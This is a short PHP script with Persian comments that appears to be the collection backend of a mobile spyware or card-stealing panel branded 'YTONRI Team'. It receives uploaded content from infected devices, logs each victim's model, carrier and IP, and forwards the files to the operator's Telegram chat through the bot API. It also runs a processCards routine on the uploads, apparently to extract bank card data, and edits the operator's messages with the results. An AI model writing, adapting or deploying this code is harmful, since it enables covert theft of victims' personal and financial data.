<?php
include("chalim.php");

define('TOKEN', $bot_token);

function bot($method, $datas = []) {
    $url = "https://api.telegram.org/bot" . TOKEN . "/" . $method;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $datas);
    $res = curl_exec($ch);
    curl_close($ch);
    return json_decode($res);
}

if (isset($_GET['response']) && $_GET['response'] == "true") {
    $device_id = $_GET['Device_id'] ?? 'unknown';
    $model = $_GET['Model'] ?? 'N/A';
    $operator = $_GET['operator'] ?? 'N/A';
    $ip = $_SERVER['REMOTE_ADDR'];
    
    // ذخیره فایل به صورت معمول
    $file_path = "user/YTONRI.txt";
    file_put_contents($file_path, file_get_contents("php://input"));
    
    // بررسی آیا پردازش کارت درخواست شده
    $process_file = "user/{$device_id}_card_process.txt";
    if (file_exists($process_file)) {
        include 'card.php';
        $process_data = json_decode(file_get_contents($process_file), true);
        
        // پردازش کارت‌ها
        $result = processCards($file_path, $model, $operator, $ip, $device_id);
        
        // ویرایش پیام قبلی
        bot('editMessageText', [
            'chat_id' => $process_data['chat_id'],
            'message_id' => $process_data['message_id'],
            'text' => "> $result",
            'parse_mode' => 'HTML'
        ]);
        
        // حذف فایل پردازش
        unlink($process_file);
    } else {
        // ارسال معمولی فایل
        $caption = "┌ 🩸 Received Content\n\n"
                 . "├ 🦇 Model: $model\n"
                 . "├ 🐦‍⬛ Operator: $operator\n"
                 . "├ 💣 IP: $ip\n"
                 . "└ ♣️ Panel: /login_$device_id\n\n"
                 . "> 🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a>";
        
        bot('sendDocument', [
            'chat_id' => $id_sender,
            'document' => new CURLFile($file_path),
            'caption' => $caption,
            'parse_mode' => 'HTML'
        ]);
    }
    
    // حذف فایل موقت
    unlink($file_path);
}